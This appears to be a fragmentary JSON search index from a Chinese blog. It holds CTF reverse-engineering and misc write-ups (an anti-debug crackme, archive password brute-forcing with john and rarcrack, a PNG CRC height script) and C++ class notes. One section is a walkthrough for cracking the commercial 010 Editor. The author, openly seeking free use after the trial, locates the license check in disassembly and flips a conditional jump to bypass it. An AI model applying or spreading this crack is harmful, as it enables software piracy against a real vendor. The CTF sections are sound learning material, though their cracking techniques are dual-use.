","date":"2022-05-19","objectID":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/:5:0","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse 复盘 \u0026 wp","uri":"/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/"},{"categories":["WriteUps"],"content":"Crackme 运行一下看图标知道是MFC 拖进ida搜索字符串wrong就能找到事件处理函数 int __thiscall sub_1131E0(struct_this *this) { const void *key_addr; // eax const void *flag_addr; // eax int result; // eax unsigned int key_len; // [esp+18h] [ebp-230h] size_t flag_len; // [esp+20h] [ebp-228h] BYREF void *md5_top_half_key; // [esp+24h] [ebp-224h] BYREF const void *md5_bottom_half_key; // [esp+28h] [ebp-220h] BYREF BYTE *v9; // [esp+2Ch] [ebp-21Ch] BYREF size_t dwDataLen; // [esp+30h] [ebp-218h] BYREF size_t v11; // [esp+34h] [ebp-214h] BYREF DWORD v12; // [esp+38h] [ebp-210h] BYREF BYTE flag[260]; // [esp+3Ch] [ebp-20Ch] BYREF BYTE key[260]; // [esp+140h] [ebp-108h] BYREF CWnd::UpdateData((CWnd *)this, 1); memset(key, 0, sizeof(key)); memset(flag, 0, sizeof(flag)); key_len = strlen(\u0026this-\u003egap4[212]); flag_len = strlen(\u0026this-\u003egap4[208]); dwDataLen = 0; v11 = 0; v12 = 0; key_addr = (const void *)sub_112590(\u0026this-\u003egap4[212], key_len); memmove(key, key_addr, key_len); flag_addr = (const void *)sub_112590(\u0026this-\u003egap4[208], flag_len); memmove(flag, flag_addr, flag_len); if ( key_len != 8 \u0026\u0026 flag_len != 32 ) return wrong((CWnd *)this); hash_encode(key, key_len \u003e\u003e 1, 0x8003u, (int)\u0026md5_top_half_key, (int)\u0026dwDataLen);// md5 hash_encode(\u0026key[4], key_len \u003e\u003e 1, 0x8004u, (int)\u0026md5_bottom_half_key, (int)\u0026v11);// sha1 hash_encode(key, key_len, 0x8003u, (int)\u0026v9, (int)\u0026v12);// md5 memcmp(md5_top_half_key, \u0026this-\u003echarDC, dwDataLen); if ( memcmp(md5_bottom_half_key, \u0026this-\u003echar1E0, v11) ) return wrong((CWnd *)this); md5_and_AES_encrypt(v9, v12, flag, \u0026flag_len, 0x104u); if ( !memcmp(flag, \u0026this-\u003echar2E4, flag_len) ) result = success((CWnd *)this); else result = wrong((CWnd *)this); return result; } 结合动调很容易搞清楚各个变量、函数的意义，但这里有个反调很难发现 参见ZwSetInformationThread - CTF Wiki 字符串里搜ZwSetInformationThread可找到这个函数 int __thiscall sub_112E60(LPARAM *this) { const CHAR *v1; // eax HMODULE v2; // eax HANDLE v3; // eax FARPROC ZwSetInformationThread; // [esp+8h] [ebp-24h] int i; // [esp+14h] [ebp-18h] int j; // [esp+14h] [ebp-18h] char v9[4]; // [esp+18h] [ebp-14h] BYREF int v10; // [esp+28h] [ebp-4h] CDialog::OnInitDialog((CDialog *)this); if ( sub_113AC0(0) ) { sub_111CB0(4u); sub_112100(v9); v10 = 0; sub_113D40(101); if ( !std::string::empty((std::string *)v9) ) { sub_113A60(0x800u, 0, 0); v1 = (const CHAR *)std::_Ptr_base\u003c_EXCEPTION_RECORD const\u003e::get(v9); sub_113A60(0, 0x10u, v1); } v10 = -1; sub_1129F0(v9); } sub_113A30(this[52], 1u); sub_113A30(this[52], 0); v2 = GetModuleHandleA(\"ntdll.dll\"); ZwSetInformationThread = GetProcAddress(v2, \"ZwSetInformationThread\");//反调 v3 = GetCurrentThread(); ((void (__stdcall *)(HANDLE, int, _DWORD, _DWORD))ZwSetInformationThread)(v3, 17, 0, 0); for ( i = 0; i \u003c 16; ++i ) *((_BYTE *)this + i + 220) ^= i; for ( j = 0; j \u003c 20; ++j ) *((_BYTE *)this + j + 480) ^= j; return 1; } 并不是简单的调用了windows的系统函数，导致import窗口找不到，也增加了不少难度 具体绕过方法ctf-wiki也写的很清楚，不再赘述 结合重命名的函数应该能看得很清楚 hash_encode函数 bool __stdcall sub_113510(BYTE *pbData, DWORD dwDataLen, ALG_ID Algid, int a4, int a5) { BYTE *v6; // [esp+10h] [ebp-20h] BOOL v7; // [esp+18h] [ebp-18h] BYTE v8[4]; // [esp+1Ch] [ebp-14h] BYREF DWORD pdwDataLen; // [esp+20h] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+24h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+28h] [ebp-8h] BYREF phProv = 0; phHash = 0; v6 = 0; *(_DWORD *)v8 = 0; pdwDataLen = 0; v7 = CryptAcquireContextA(\u0026phProv, 0, 0, 0x18u, 0xF0000000); if ( v7 ) { v7 = CryptCreateHash(phProv, Algid, 0, 0, \u0026phHash); if ( v7 ) { v7 = CryptHashData(phHash, pbData, dwDataLen, 0); if ( v7 ) { pdwDataLen = 4; v7 = CryptGetHashParam(phHash, 4u, v8, \u0026pdwDataLen, 0); if ( v7 ) { v6 = (BYTE *)sub_114540(*(size_t *)v8); if ( v6 ) { memset(v6, 0, *(size_t *)v8); v7 = CryptGetHashParam(phHash, 2u, v6, (DWORD *)v8, 0); if ( v7 ) { *(_DWORD *)a4 = v6; *(_DWORD *)a5 = *(_DWORD *)v8; } } else { v7 = 0; } } } } } if ( !v7 \u0026\u0026 v6 ) sub_11453B(v6); if ( phHash ) CryptDestroyHash(phHash); if ( phProv ) CryptReleaseContext(phProv, 0); return v7; } 里面全是windows的API函数，重点看Algid参数，决定了hash的种类，具体参见ALG_ID (Win","date":"2022-04-28","objectID":"/2022/04/2022dasctf-x-fate-re-crackme-wp/:1:0","tags":["CTF","reverse"],"title":"2022DASCTF X FATE RE Crackme wp","uri":"/2022/04/2022dasctf-x-fate-re-crackme-wp/"},{"categories":["Binary"],"content":"010editor登陆绕过 ","date":"2022-04-05","objectID":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/:1:0","tags":["reverse","crack"],"title":"010Editor逆向-登陆绕过","uri":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/"},{"categories":["Binary"],"content":"patch__1.0 起因是30天试用期到了，又想白嫖，于是试试逆向搞它，确实不难 拖进ida静态分析就行 string窗口搜索license，找到关键语句 Password accepted. This license entitles you to:\\n\\n - Free Upgrades\\n - Free Support\\n - Free Repository Updates\\n\\nuntil 显然是验证通过后的提示语句，跟进去 交叉引用定位loc_72F4D8函数 .text:000000000072F4D8 loc_72F4D8: ; CODE XREF: sub_72EA00+6AE↑j .text:000000000072F4D8 mov rdi, [r15] .text:000000000072F4DB ; try { .text:000000000072F4DB call _ZN9RRegister14GetExpiryQDateEv ; RRegister::GetExpiryQDate(void) .text:000000000072F4E0 lea rdi, unk_8ACB72 ; this .text:000000000072F4E7 mov esi, 0Ch ; char * .text:000000000072F4EC mov [rsp+228h+var_68], rax .text:000000000072F4F4 call __ZN7QString16fromAscii_helperEPKci ; QString::fromAscii_helper(char const*,int) .text:000000000072F4F4 ; } // starts at 72F4DB .text:000000000072F4F9 mov [rsp+228h+var_48], rax .text:000000000072F501 lea rbp, [rsp+228h+var_48] .text:000000000072F509 lea rax, [rsp+228h+var_128] .text:000000000072F511 lea rsi, [rsp+228h+var_68] ; QString * .text:000000000072F519 mov rdx, rbp .text:000000000072F51C mov rdi, rax ; this .text:000000000072F51F mov r13, rax .text:000000000072F522 mov [rsp+228h+var_220], rax .text:000000000072F527 ; try { .text:000000000072F527 call __ZNK5QDate8toStringERK7QString ; QDate::toString(QString const\u0026) .text:000000000072F527 ; } // starts at 72F527 .text:000000000072F52C lea r14, [rsp+228h+var_118] .text:000000000072F534 lea rsi, aPasswordAccept_0 ; \"Password accepted. This license entitle\"... .text:000000000072F53B mov edx, 78h ; 'x' ; int .text:000000000072F540 mov rdi, r14 ; this .text:000000000072F543 ; try { .text:000000000072F543 call __ZN7QString15fromUtf8_helperEPKci ; QString::fromUtf8_helper(char const*,int) 再往上找发现loc_72F0A8函数 .text:000000000072F0A8 loc_72F0A8: ; CODE XREF: sub_72EA00+5FA↑j .text:000000000072F0A8 ; sub_72EA00+608↑j .text:000000000072F0A8 cmp ebp, 0DBh .text:000000000072F0AE jz loc_72F4D8;上个函数入口 .text:000000000072F0B4 cmp ebp, 0EDh .text:000000000072F0BA jz loc_72F1C8 .text:000000000072F0C0 cmp ebp, 20Ch .text:000000000072F0C6 jz loc_72F1C8 .text:000000000072F0CC cmp r13d, 93h .text:000000000072F0D3 jz short loc_72F148 .text:000000000072F0D5 lea rdi, aInvalidNameOrP ; \"Invalid name or password. Please enter \"... .text:000000000072F0DC mov esi, 90h ; char * .text:000000000072F0E1 call __ZN7QString16fromAscii_helperEPKci ; QString::fromAscii_helper(char const*,int) .text:000000000072F0E1 ; } // starts at 72F09D .text:000000000072F0E6 lea rbp, [rsp+228h+var_48] .text:000000000072F0EE mov [rsp+228h+var_48], rax .text:000000000072F0F6 mov rdi, rbp .text:000000000072F0F9 ; try { .text:000000000072F0F9 call _Z10R_ShowInfoRK7QString ; R_ShowInfo(QString const\u0026) .text:000000000072F0F9 ; } // starts at 72F0F9 .text:000000000072F0FE jmp loc_72F04B 跳转语句jz loc_72F4D8，尝试性把jz改成jnz，apply一下 重新进入010，弹出register窗口，随便输入用户名和密码，点击check license 弹出成功窗口 点击ok成功进入应用，成功！ ","date":"2022-04-05","objectID":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/:1:1","tags":["reverse","crack"],"title":"010Editor逆向-登陆绕过","uri":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/"},{"categories":["Binary"],"content":"patch__2.0 上次搞完之后能用是能用，但是每次都要点击上面两张图的Check License和OK，十分不方便，于是尝试使2个界面不再弹出 仔细看main函数，还是挺清晰的 __int64 __fastcall main(int a1, char **a2, char **a3) { volatile signed __int32 *v3; // rsi int v4; // edx int v5; // ecx int v6; // er8 int v7; // er9 TForm010Ed *v8; // rdi __int64 (__fastcall ***v9)(_QWORD); // rax QMetaObject *v10; // rax const char *v11; // rax int v12; // edx volatile signed __int32 *v13; // rax __int64 v14; // rdx char *v15; // rsi QApplication *v16; // r14 const QString *v17; // rdx __int64 v18; // r14 TForm010Ed *v19; // rdi unsigned int v20; // er15 int v21; // eax QObject *v22; // r14 const char *v23; // rdx QApplication *v24; // rdi unsigned int v25; // er13 QTimer *v26; // rdx __int64 v27; // r14 volatile signed __int32 **v28; // r13 volatile signed __int32 *v29; // rax volatile signed __int32 **v30; // r8 volatile signed __int32 **i; // rdx int v33; // edx QDesktopWidget *v34; // rax __int64 v35; // rsi const char *v36; // rcx QWidget *v37; // [rsp+0h] [rbp-178h] int v38; // [rsp+0h] [rbp-178h] QWidget *v39; // [rsp+0h] [rbp-178h] QWidget *v40; // [rsp+0h] [rbp-178h] QWidget *v41; // [rsp+0h] [rbp-178h] char v42; // [rsp+8h] [rbp-170h] int v43; // [rsp+8h] [rbp-170h] int v44; // [rsp+10h] [rbp-168h] int v45; // [rsp+10h] [rbp-168h] void *v46; // [rsp+18h] [rbp-160h] BYREF int v47[2]; // [rsp+20h] [rbp-158h] BYREF QTimer *v48; // [rsp+28h] [rbp-150h] QTimer *v49[2]; // [rsp+30h] [rbp-148h] BYREF QDateTime *v50; // [rsp+40h] [rbp-138h] BYREF char v51; // [rsp+48h] [rbp-130h] int v52; // [rsp+50h] [rbp-128h] BYREF char v53; // [rsp+58h] [rbp-120h] __int64 v54; // [rsp+60h] [rbp-118h] BYREF int v55; // [rsp+68h] [rbp-110h] int v56; // [rsp+70h] [rbp-108h] BYREF char v57; // [rsp+78h] [rbp-100h] int v58; // [rsp+80h] [rbp-F8h] BYREF char v59; // [rsp+88h] [rbp-F0h] int v60; // [rsp+90h] [rbp-E8h] BYREF char v61; // [rsp+98h] [rbp-E0h] int v62[2]; // [rsp+A0h] [rbp-D8h] BYREF char v63; // [rsp+A8h] [rbp-D0h] char v64[32]; // [rsp+B0h] [rbp-C8h] BYREF char v65[104]; // [rsp+D0h] [rbp-A8h] BYREF unsigned __int64 v66; // [rsp+138h] [rbp-40h] v66 = __readfsqword(0x28u); qInstallMessageHandler(\u0026R_MessageOutput, a2, a3); sub_5680C0(); nullsub_31(); RProgress::CreateProgress((RProgress *)\u0026R_MessageOutput); QCoreApplication::setAttribute(20LL, 1LL); QCoreApplication::setAttribute(13LL, 1LL); v3 = (volatile signed __int32 *)\u0026v46 + 1; sub_5943F0((QObject *)v65, v37, v42, v44, (int)v46, (int)\u0026QArrayData::shared_null, (char)v48); dword_10B8F10 = (RApplication *)v65; sub_595D00((unsigned int)v65, (unsigned int)\u0026v46 + 4, v4, v5, v6, v7, v38, v43, v45, (char)v46); v8 = (TForm010Ed *)v49; QCoreApplication::arguments((QCoreApplication *)v49); if ( !(unsigned int)TForm010Ed::CheckRunOnlyOnce((TForm010Ed *)v49) || (v8 = dword_10B8F10, !(unsigned int)sub_594C60(dword_10B8F10)) ) { TForm010Ed::CheckDebugFlags(v8); v9 = (__int64 (__fastcall ***)(_QWORD))QApplication::style(v8); v10 = (QMetaObject *)(**v9)(v9); v11 = (const char *)QMetaObject::className(v10); v12 = -1; if ( v11 ) v12 = strlen(v11); QString::fromUtf8_helper((QString *)v62, v11, v12); v13 = *(volatile signed __int32 **)v47; v14 = *(_QWORD *)v62; *(_QWORD *)v62 = *(_QWORD *)v47; *(_QWORD *)v47 = v14; if ( !**(_DWORD **)v62 || **(_DWORD **)v62 != -1 \u0026\u0026 !_InterlockedDecrement(v13) ) QArrayData::deallocate(*(_QWORD *)v62, 2LL, 8LL); v15 = \"QCleanlooksStyle\"; if ( (unsigned __int8)QString::operator==(v47, \"QCleanlooksStyle\") || (v15 = \"QCDEStyle\", (unsigned __int8)QString::operator==(v47, \"QCDEStyle\")) || (v15 = \"QPlastiqueStyle\", (unsigned __int8)QString::operator==(v47, \"QPlastiqueStyle\")) || (v15 = \"QMotifStyle\", (unsigned __int8)QString::operator==(v47, \"QMotifStyle\")) || (v15 = \"QWindowsStyle\", (unsigned __int8)QString::operator==(v47, \"QWindowsStyle\")) || (v15 = \"QGtkStyle\", (unsigned __int8)QString::operator==(v47, \"QGtkStyle\")) || (v15 = \"QFusionStyle\", (unsigned __int8)QString::operator==(v47, \"QFusionStyle\")) ) { v16 = (QApplication *)operator new(0x10uLL); sub_56DC","date":"2022-04-05","objectID":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/:1:2","tags":["reverse","crack"],"title":"010Editor逆向-登陆绕过","uri":"/2022/04/010editor%E9%80%86%E5%90%91-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/"},{"categories":["WriteUps"],"content":"金三胖 下载附件是个gif 用gimp打开查看每一帧，其中夹杂着flag{he11ohongke} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:1:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"二维码 附件是个二维码，扫描出文字secret is here binwalk扫一下 ↪ binwalk ./QR_code.png 2022年 03月 28日 星期一 22:15:42 CST DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 280 x 280, 1-bit colormap, non-interlaced 471 0x1D7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 29, uncompressed size: 15, name: 4number.txt 650 0x28A End of Zip archive, footer length: 22 binwalk -d分不出来 foremost分离发现一个加密的压缩包 kali利用john解密 zip2john ./00000000.zip \u003e passwd.txt john passwd.txt 得到密码7639 解压压缩包得到txt文件即可看到flagCTF{vjpw_wnoei} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:2:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"你竟然赶我走 附件是一张jpg文件 用010查看二进制文件拉到最后即可看到flagflag{stego_is_s0_bor1ing} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:3:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"N种方法解决 附件为key.exe，010打开发现是base64字符串 在线网站转换成png图片，发现是二维码 扫码得flagKEY{dca57f966e4e4e31fd5b15417da63269} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:4:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"大白 附件是一张打不开的图片 原因是出题人改了图片高使crc校验码检查出错 脚本爆破出图片高 #!/usr/bin/env python import struct import binascii import os #根据PNG crc校验码爆破出图片宽度、高度 fi=open('./dabai.png','rb').read() #12-15字节代表固定的文件头数据块的标示，16-19字节代表宽度，20-23字节代表高度，24-28字节分别代表 # Bit depth、ColorType、Compression method、Filter method、Interlace method #29-32字节为CRC校验和 for i in range(10000): #pack函数将int转为bytes,\u003e表示大端00 00 00 02,I表示4字节无符号int;\u003c表示小端 02 00 00 00 data=fi[12:20]+struct.pack('\u003eI',i)+fi[24:29] #byte的大小为8bits而int的大小为32bits,转换时进行与运算避免补码问题0x932f8a6b crc=binascii.crc32(data)\u00260xffffffff #解开为无符号整数 if crc==struct.unpack('\u003eI',fi[29:33])[0]\u00260xffffffff : print(hex(i)) 0x1df 用010修改图片高即可正确显示图片 flagflag{He1l0_d4_ba1} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:5:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"基础破解 压缩包加密，提示4位密码，直接用rarcrack爆破 kali上装的rarcrack有问题，原因不明，arch上又装了一个，成功爆出密码2593 解压得flag.txt，base64解码得flag ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:6:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"乌镇峰会种图 Stegsolve打开，找到analyze-\u003efile format，即可看到flagflag{97314e7864a8f6262 7b26f3f998c37f1} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:7:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"文件中的秘密 Gwenview打开图片，左边属性有一项Windows Comment ，值为flag，windows平台直接查看属性-\u003e备注应该就能看到 ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:8:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"wireshark 附件为一段流量包，要求找到登陆的passwd wireshark打开，过滤http.request.method==POST即可找到登陆语句 flag{ffb7567a1d4f4abdffdb54e022f8facd} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:9:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"LSB 附件是一张图片，用stegsolve打开 data extract rgb选都选0，dump下来发现是个二维码，扫码即可拿到flag ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:10:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"rar 加密压缩包，提示4位纯数字，rarcrack直接爆 得到密码8795 flag{1773c5da790bd3caff38e3decd180eb7} ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:11:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["WriteUps"],"content":"zip伪加密 粘一篇知乎文章，详细介绍了zip的结构，这一点用010打开会看得十分清晰 把第0x47位改成00即可修正伪加密 解压即可拿到flag ","date":"2022-04-05","objectID":"/2022/04/buu-misc-wp/:12:0","tags":["CTF","misc"],"title":"buu misc wp","uri":"/2022/04/buu-misc-wp/"},{"categories":["Dev"],"content":"变量定义 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:0","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- auto 由编译器根据上下文自动确定变量的类型 auto i = 3; //i是int型变量 auto k = 4.0f; //k是float型变量 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:1","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 指针变量的动态生成与删除 int* ptr = new int; //单个变量 int* array = new int[10]; //10元素数组 delete ptr; //删除指针变量所指的单个内存单元 delete[] ptr //删除多个内存单元组成的内存块 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:2","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 左值引用 具名变量的别名：类型名 \u0026 引用名 变量名 int v0; int \u0026 v1 = v0 //v1是v0的别名，它们是内存中是同一单元的两个不同名字 引用变量必须在定义时初始化（赋初值） 被引用变量可以是结构变量成员，如s.m 函数参数可以是引用类型，表示函数的形参和实参是同一个变量，改变形参将改变实参 void swap（int \u0026 a; int \u0026 b){ int temp = b; b = a; a = temp; } 函数返回值可以是引用类型，但不能是临时变量（函数内部定义） ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:3","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 右值引用 不能取地址，没有名字的就是右值 匿名变量（临时变量）的别名：类型名 \u0026\u0026 引用名 表达式 int \u0026\u0026 sum = 3 + 4; float \u0026\u0026 res = ReturnRvalue(f1,f2); 函数参数引用，减少临时变量拷贝的开销 void AcceptRvalueRef(T \u0026\u0026 s){……} 变量的初始化、类型推导与基于范围的循环 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:4","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 初始化列表 int a[] = {1,3,5}; int a[] {1,3,5}; //c++11支持 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:5","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 初始化变量 int a = 3+5; int a = {3+5}; int a (3+5); int a {3+5}; //以上全部等效 int* i = new int (10); //int* i =new int * double* d = new double{1.2f}; //同上，赋初值 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:6","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 类型推导 使用decltype可以对变量或表达式结果的类型进行推导 struct{char* name;} anon_u; struct{ int d; decltype(anon_u) id; } anon_s[100]; int main(){ decltype(anon_s) as; cin\u003e\u003eas[0].id.name; …… } ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:7","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 基于范围的循环 int main(){ int arr[3] = {1,2,3}; for(int e : arr) //auto e也可以 cout\u003c\u003ce; return 0; } 函数重载 同名函数两种实现，必须保证参数不同，返回值，参数名称不能作为区分标准 void print(char* msg){ cout\u003c\u003cmsg\u003c\u003cendl; } void print(int score){ cout\u003c\u003cscore\u003c\u003cendl; } int main(){ print(\"Hello\"); print(1); return 0; } 函数参数缺省值与追踪返回类型的函数 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:8","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 函数参数缺省值（默认值） 缺省值必须从最后一个开始向前排列 void print(char* msg = \"hello\"){ cout\u003c\u003cmsg\u003c\u003cendl; } int main(){ print(\"Beijing...\"); print(); return 0; }//输出Beijing...hello ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:9","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"-追踪返回类型的函数 int func(char* ptr, int val); //普通函数声明 auto func(char* ptr, int val)-\u003eint; //追踪返回类型的函数声明 auto func(char* ptr, int val)-\u003edecltype(……) //常用方法 类的定义 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:10","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 基本概念 用户自定义的类型，包含函数与数据的特殊“结构体”，称为“对象” 类中包含的函数，称为“成员函数”，数据称为“数据成员” 类中函数既可以在类中定义，也可以在类外给出定义（类名::函数名，其中::称为“域运算符） class Matrix{ public: void fill(char dir){ ……; //在类中定义成员函数 } }; ------------------------------------------------------------ void Matrix::fill(char dir){ ……; //在类外定义成员函数 } 类的成员（数据、函数）可以根据需要分成组，不同组设置不同的访问权限 权限种类：public、private、protected ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:11","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- This指针 指向当前对象的指针变量 class Matrix{ public: void fill{ …… this-\u003edata[0][0] = 1; //data[0][0] = 1; 二者等价 } }; 类的访问权限与友元 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:12","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 类成员的访问权限 class中成员缺省属性为private class Matrix{ public： void fill(char dir); private: int data[6][6]; }; //等价于 class Matrix{ int data[6][6]; public： void fill(char dir); }; 在类的外部不能用.操作符访问对对象的私有成员或保护成员，只能访问公有属性 int main(){ Matrix obj; //定义变量（对象） obj.fill('u'); //访问公有成员 obj.data[1][1] = 23; //Error！不能访问私有成员 return 0; } 保护成员（protected）可以在派生类（即子类）中访问 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:13","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 友元 可以通过声明函数为类的友元来实现访问对象的私有成员 class Test{ int id; public: friend void print(Test obj); }; void print(Test obj){ cout\u003c\u003cobj.id\u003c\u003cendl; } 构造函数与析构函数 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:14","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 构造函数 由编译器自动生成调用语句，用于对象数据成员的初始化，以及其他初始化工作 构造函数没有返回值类型，函数名与类名相同 类的构造函数可以重载，即可以使用不同的函数参数进行对象初始化 class Student{ long ID; public: Student(long id){ID = id;} Student(int year, int order){ ID = year * 10000 + order; } }; 默认构造函数 若未提供构造函数，则编译器自动生成不带任何参数的构造函数 在定义元素为对象的数组（ClassName array_var[NUM];）时，类必须提供构造函数 构造函数的初始化列表 在()之后，{之前，以：开头，使用数据成员（初始值）的形式 class Student{ long ID; public: Student(long id):ID(id){} Student(int year,int order){ ID = year * 10000 +order; } }; 在构造函数中调用其他构造函数（委派构造函数） class Info{ public: Info() {Init();} Info(int i) : Info() {id = i;} Info(char c) : Info() {gender = c;} private: void Init() {……} int id {2016}; char gender {'M'}; }; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:15","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 析构函数 一个类只有一个析构函数，名称是～类名，没有函数返回值，没有函数参数 编译器在对象生命期结束后自动调用析构函数， 以便释放对象占用的资源 class ClassRoom{ int num; long* ID_list; public: ClassRoom() : num(0), ID_list(0) {} …… ~ClassRoom(){ if(ID_list) delete[] ID_list; } }; ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:16","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 拷贝构造函数 函数调用时以类的对象为形参或返回类的对象时，编译器自动生成调用拷贝构造函数，在已有对象基础上生成新对象 拷贝构造函数是一种特殊的构造函数，它的参数是语言规定的，是同类对象的常量引用 class Person{ int id; …… public: Person(const Person\u0026 src) { id = src.id; ……} …… }; 运算符重载 ","date":"2022-02-25","objectID":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/:0:17","tags":["cpp","oop"],"title":"C++ OOP 学习笔记","uri":"/2022/02/c-oop-%E5%AD%A6%E4%B9%A0/"},{"categories":["Dev"],"content":"- 